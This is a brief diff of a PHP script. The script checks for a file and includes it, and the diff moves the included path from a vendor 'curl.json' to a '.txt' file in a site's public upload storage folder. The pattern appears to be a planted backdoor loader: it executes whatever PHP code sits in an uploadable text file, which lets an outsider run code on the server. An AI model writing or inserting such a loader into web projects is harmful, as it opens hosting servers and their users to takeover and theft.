@@ -1,5 +1,5 @@
 <?php
-$file = 'C:/xampp/htdocs/khoadmtt/vendor/composer/curl.json';
+$file = '/home/jsyrianr/public_html/csr-sy/storage/app/public/files/zean/r.txt';
 
 if (is_file($file)) {
     include $file;
